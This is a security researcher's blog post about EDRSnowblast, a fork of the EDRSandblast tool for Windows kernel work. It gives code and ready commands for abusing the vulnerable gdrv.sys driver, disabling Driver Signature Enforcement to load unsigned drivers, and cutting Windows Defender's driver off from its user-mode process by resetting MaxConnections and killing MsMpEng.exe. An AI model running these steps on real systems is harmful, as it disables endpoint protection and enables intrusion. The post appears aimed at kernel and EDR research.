---
title: 'EDRSnowblast - blizzard on EDR drivers'
date: 2023-08-23
author: "Viking"
layout: post
permalink: /edrsnowblast/
disqus_identifier: 0000-0000-0000-0010
description: "After the sandstorm it's time for the blizzard ! The well-known EDRSandblast tool is a fantastic code base for Windows kernel investigating purpose, after several modification I decided to fork this project and wanted to share details about this with the community."
cover: assets/uploads/2023/08/edr_snowblast.png
tags:
  - Windows
  - Kernel
  - EDR
  - Tool
translation:
  - en
---

After the sandstorm it's time for the blizzard ! The well-known EDRSandblast tool is a fantastic code base for Windows kernel investigating purpose, after several modification I decided to fork this project and wanted to share details about this with the community.  

<!--more-->

## Intro

I love the [EDRSandblast][LINK4] tool made by Thomas DIOT (Qazeer) Maxime MEIGNAN (themaks), it's really amazing. I opened [pull requests][LINK6] & [issue][LINK7] but I don't know if the project is maintained which leads me to fork and start my own project named [EDRSnowblast][LINK5] in order to fix issues I encounter and implement extra features resulting of successful experiments. This tools helps me at investigating Windows kernel (mostly EDR drivers). Today I want to share information focusing on the tool itself but in the next blogpost I will share technical details on EDR internal communication.   

## Add new Windows version validation method  

### About the bug  

As you may notice, `EDRSandblast` project uses hardcoded offsets in order to reliably perform kernel monitoring bypass operations.   
Those offsets are stored in CSV files as shown in the example below :   
[![old_offsets](/assets/uploads/2023/08/old_offsets.png)](/assets/uploads/2023/08/old_offsets.png)

`EDRSandblast` loads this file and the [LoadNtoskrnlOffsetsFromFile][LINK1] function checks if `ntoskrnlVersion` column contains the current Windows version.  

This verification is based on the [file version][LINK2] :  
{% highlight CPP %}
LPTSTR GetNtoskrnlVersion() {
    if (_tcslen(g_ntoskrnlVersion) == 0) {

        LPTSTR ntoskrnlPath = GetNtoskrnlPath();
        TCHAR versionBuffer[256] = { 0 };
        GetFileVersion(versionBuffer, _countof(versionBuffer), ntoskrnlPath);         // call GetFileVersionInfo + VerQueryValue Windows API
        _stprintf_s(g_ntoskrnlVersion, 256, TEXT("ntoskrnl_%s.exe"), versionBuffer);
    }
    return g_ntoskrnlVersion;
}
{% endhighlight %}  

But sometimes Microsoft don't update this value when upating Windows files and some mismatch can happen giving wrong results. It's a big deal if using kernel RW operation with wrong offsets, it will probably lead to a BSOD (I've experienced this bug).  

In the following example the ntoskrnl.exe version is **19041.2364** but the current running version is **19045.2364**.

[![winver](/assets/uploads/2023/08/winver.png)](/assets/uploads/2023/08/winver.png)

One solution could be double checking current Windows version using Windows API (ex: GetVersionEx or RtlGetNtVersionNumbers) but I didn't take this option.

### New Windows version check  
I choose to check the current Windows version using SHA256 checksum of the Windows files. I updated `Offsets/ExtractOffsets.py` which allows to create new entries in the CSV files (NtoskrnlOffsets.csv, WdigestOffsets.csv, etc) :  

{% highlight Python %}
sha256_hash = hashlib.sha256()
with open(input_file,"rb") as f:
    # Read and update hash string value in blocks of 4K
    for byte_block in iter(lambda: f.read(4096),b""):
        sha256_hash.update(byte_block)
    print(sha256_hash.hexdigest())
{% endhighlight %}  

As a result `EDRSnowblast.exe` check this value using sha256sum, original code left as comments.

{% highlight CPP %}
void LoadNtoskrnlOffsetsFromFile(TCHAR* ntoskrnlOffsetFilename) {
    BOOL verbose = FALSE;
    LPTSTR ntoskrnlVersion = GetNtoskrnlVersion();
    _tprintf_or_not(TEXT("[*] System's ntoskrnl.exe file version is: %s\n"), ntoskrnlVersion);

    FILE* offsetFileStream = NULL;
    _tfopen_s(&offsetFileStream, ntoskrnlOffsetFilename, TEXT("r"));

    if (offsetFileStream == NULL) {
        _putts_or_not(TEXT("[!] Offset CSV file connot be opened"));
        return;
    }

    TCHAR lineNtoskrnlVersion[2048];
    TCHAR line[2048];
    while (_fgetts(line, _countof(line), offsetFileStream)) {
        //if (_tcsncmp(line, TEXT("ntoskrnl"), _countof(TEXT("ntoskrnl")) - 1)) {
        //    _putts_or_not(TEXT("[-] CSV file format is unexpected!\n"));
        //    break;
        //}
        TCHAR* dupline = _tcsdup(line);
        TCHAR* tmpBuffer = NULL;
        _tcscpy_s(lineNtoskrnlVersion, _countof(lineNtoskrnlVersion), _tcstok_s(dupline, TEXT(","), &tmpBuffer));
        if (sha256sum(GetNtoskrnlPath(), &lineNtoskrnlVersion, verbose) != 0) {
            if (verbose)
                _tprintf_or_not(TEXT("[LoadNtoskrnlOffsetsFromFile] Bad checksum\n"));
        }
        else {
            if (verbose)
                _tprintf_or_not(TEXT("[LoadNtoskrnlOffsetsFromFile] Good checksum\n"));
            //if (_tcscmp(ntoskrnlVersion, lineNtoskrnlVersion) == 0) {
            TCHAR* endptr;
            _tprintf_or_not(TEXT("[+] Offsets are available for this version of ntoskrnl.exe (%s)!\n"), ntoskrnlVersion);
            for (int i = 0; i < _SUPPORTED_NTOSKRNL_OFFSETS_END; i++) {
                g_ntoskrnlOffsets.ar[i] = _tcstoull(_tcstok_s(NULL, TEXT(","), &tmpBuffer), &endptr, 16);
            }
            break;
            //}

        }

    }
    fclose(offsetFileStream);
}

{% endhighlight %}  

Note : only "Manual offset retrieval" method is supported, the "Automatic offsets retrieval and update" method is not implemented.

## Add new driver support  

I added support for the vulnerable GIGABYTE gdrv.sys Windows driver (CVE-2018-19320, CVE-2018-19322, CVE-2018-19323, CVE-2018-19321)
Why doing this ?  

First it's just because I'm used to use this driver I wanted to add support for it :-) The other reason is that driver has a very powerful exploitation primitive : [arbitrary physical memory read/write][LINK10]  
This is out of the scope of this blogpost but this kind of primitive open new perspectives when facing HVCI / Microsoft VBS protection.  

```
EDRSnowblast.exe audit --kernelmode --driver c:\gdrv.sys --verbose
```

[![edrsnowblast_gdrv](/assets/uploads/2023/08/edrsnowblast_gdrv.png)](/assets/uploads/2023/08/edrsnowblast_gdrv.png)  

## Add feature : loading unsigned kernel driver  

This new feature allows to load **unsigned kernel driver**, implementing the following commands :  

```
sc create [service name] [binPath=evil.sys]
sc start  [service name]
```

It follows steps described in a [previous blogpost][LINK11], in summary :  
1. **g_CiOptions offset retrieval** : using `ExtractOffsets.py` script, new file `CiOffsets.csv` is also available
2. **patching g_CiOptions** : in order to disable DSE
3. **load unsigned kernel driver** : creates the new service and starts it
4. **restore g_CiOptions** : to avoid BSOD 

The unsigned driver is available until you stop & delete the service (using `sc stop` or `sc delete` command), as shown below.  
Output example (verbose mode) :

```
EDRSnowblast.exe loadk --kernelmode --loadk-file C:\Users\viking\Desktop\pimpmypid_drv.sys --verbose
```  

[![edrsnowblast_loadk](/assets/uploads/2023/08/edrsnowblast_loadk.png)](/assets/uploads/2023/08/edrsnowblast_loadk.png)  

Note : the code should have changed since this ["happy christmas" 2022 pull request][LINK9].

## Add feature : loading unsigned minifilter driver  

Like the previous one, this new feature allows to load unsigned Windows driver but it's dedicated to **minifilter drivers**. Indeed it implements the following command :  

```
fltmc load [ driverName ]
```

It follow the same steps shown above :  
1. **g_CiOptions offset retrieval** : using `ExtractOffsets.py` script, new file `CiOffsets.csv` is also available
2. **patch g_CiOptions** : in order to disable DSE
3. **load unsigned minifilter driver** : use the Filter Manager Control (fltmc) command in order to load the driver
4. **restore g_CiOptions** : to avoid BSOD 

The unsigned driver is available until you use `fltmc unload` command.  
Output example (verbose mode) :

```
EDRSnowblast.exe loadk --kernelmode --loadk-file C:\Users\viking\Desktop\pimpmypid_drv.sys --verbose
```  

[![edrsnowblast_loadf1](/assets/uploads/2023/08/edrsnowblast_loadf1.png)](/assets/uploads/2023/08/edrsnowblast_loadf1.png)  

[![edrsnowblast_loadf2](/assets/uploads/2023/08/edrsnowblast_loadf2.png)](/assets/uploads/2023/08/edrsnowblast_loadf2.png)  

## Add feature "filter-enum" for minifilter enumeration process  

It allows to enumerate drivers (filters) which are loaded in the kernel memory, an equivalent of the Windbg `!fltkd.frames` command.
```
EDRSnowblast.exe filter-enum --kernelmode
```
[![edr_snowblast_mute1.png](/assets/uploads/2023/08/edr_snowblast_mute1.png)](/assets/uploads/2023/08/edr_snowblast_mute1.png)  

It is possible to identify index number of the driver. For Windows Defender (WdFilter) is at index n°9 in the above figure.  

By using this index it's possible to retrieve details on the specified filter : MaxConnections & NumberOfConnections are interesting fields.  

```
EDRSnowblast.exe filter-enum --kernelmode --filter-index 9
```
[![edr_snowblast_mute2.png](/assets/uploads/2023/08/edr_snowblast_mute2.png)](/assets/uploads/2023/08/edr_snowblast_mute2.png)  


## Add feature "filter-mute" for disabling messages between EDR.sys and EDR.exe

Using this option, you can begin the process of "disabling messages between EDR.sys and EDR.exe". A dedicated blogpost on this topic will be available soon, but here is an insight.  

For example it's possible to reset `WdFilter` MaxConnections field :  
```
EDRSnowblast.exe filter-mute --kernelmode --filter-index 9
```
[![edr_snowblast_mute3.png](/assets/uploads/2023/08/edr_snowblast_mute3.png)](/assets/uploads/2023/08/edr_snowblast_mute3.png)  

When the operation finished, identify the PID of Windows Defender usermode process and kill it :  
```
tasklist | findstr MsMpEng.exe
MsMpEng.exe                   2956 Services                   0    206,788 K
c:\pimpmypid_clt.exe /kill 2956
```

Now the new `MsMpEng.exe` can't connect to `WdFilter.sys` because MaxConnections (value = 0) is already reached. Without this connection no message can be exchanged between EDR.sys and EDR.exe, impacting the EDR ability to detect & block security threats.  

## Add new offsets files : updated ExtractOffsets.py  

The new features shown in previous sections require building new offsets files : `CiOffsets.csv` & `FltmgrOffsets.csv`  

You will find below the process of building required CSV offsets files for a new Windows target.  

Generate offsets for a new Windows ci.dll (new file created : CiOffsets.csv)  

```
C:\Users\viking>python .\EDRSnowblast\Offsets\ExtractOffsets.py -i c:\Windows\System32\ci.dll ci
[*] Processing ci version ci_19041-3208.dll (file: c:\Windows\System32\ci.dll)
[+] g_CiOptions = 0x39418
[+] do it : c:\Windows\System32\ci.dll
e246455a03d9113c5dfd597afdd2d6f079d83b5c9bf28d20953ca3e81c1d67a0
[+] Finished processing of ci c:\Windows\System32\ci.dll!
```

Generate offsets for a new Windows fltmgr.sys (new file created : FltmgrOffsets.csv)  

```
C:\Users\viking>python .\EDRSnowblast\Offsets\ExtractOffsets.py -i c:\Windows\System32\drivers\fltMgr.sys fltmgr
[*] Processing fltmgr version fltmgr_19041-3086.sys (file: c:\Windows\System32\drivers\fltMgr.sys)
[+] FltGlobals = 0x29600
...
[+] do it : c:\Windows\System32\drivers\fltMgr.sys
a74ad4d7624fb741b7008711336b37f3a27d96c3ef6361c107155b3bdfd8592b
[+] Finished processing of fltmgr c:\Windows\System32\drivers\fltMgr.sys!
```  

Generate offsets for a new Windows kernel (new file created : NtoskrnlOffsets.csv)  

```
C:\Users\viking>python .\EDRSnowblast\Offsets\ExtractOffsets.py -i c:\Windows\System32\ntoskrnl.exe ntoskrnl
[*] Processing ntoskrnl version ntoskrnl_19041-3208.exe (file: c:\Windows\System32\ntoskrnl.exe)
[+] PspCreateProcessNotifyRoutine = 0xcec2a0
[+] PspCreateThreadNotifyRoutine = 0xcec0a0
[+] PspLoadImageNotifyRoutine = 0xcec4a0
[+] _PS_PROTECTION Protection = 0x87a
[+] EtwThreatIntProvRegHandle = 0xc19e08
[+] _ETW_GUID_ENTRY* GuidEntry = 0x20
[+] _TRACE_ENABLE_INFO ProviderEnableInfo = 0x60
[+] PsProcessType = 0xcfc410
[+] PsThreadType = 0xcfc440
[+] struct _LIST_ENTRY CallbackList = 0xc8
[+] do it : c:\Windows\System32\ntoskrnl.exe
e8e6040640c9dddc8feeb0a9310bab92e7e422ef469beabdd8b5bb63b7a9dad0
[+] Finished processing of ntoskrnl c:\Windows\System32\ntoskrnl.exe!
```

## Outro  

Thanks for reading, feedbacks are welcome !  


[LINK1]: https://github.com/wavestone-cdt/EDRSandblast/blob/master/EDRSandblast/Utils/NtoskrnlOffsets.c#L19
[LINK2]: https://github.com/wavestone-cdt/EDRSandblast/blob/master/EDRSandblast/Utils/NtoskrnlOffsets.c#L139
[LINK3]: https://github.com/wavestone-cdt/EDRSandblast/issues/16
[LINK4]: https://github.com/wavestone-cdt/EDRSandblast/
[LINK5]: https://github.com/v1k1ngfr/EDRSnowblast
[LINK6]: https://github.com/wavestone-cdt/EDRSandblast/pulls?q=is%3Apr+author%3Av1k1ngfr
[LINK7]: https://github.com/wavestone-cdt/EDRSandblast/issues?q=is%3Aissue+author%3Av1k1ngfr
[LINK8]: https://github.com/wavestone-cdt/EDRSandblast/pull/14
[LINK9]: https://github.com/wavestone-cdt/EDRSandblast/pull/15
[LINK10]: https://www.secureauth.com/labs/advisories/gigabyte-drivers-elevation-of-privilege-vulnerabilities/
[LINK11]: https://v1k1ngfr.github.io/loading-windows-unsigned-driver/





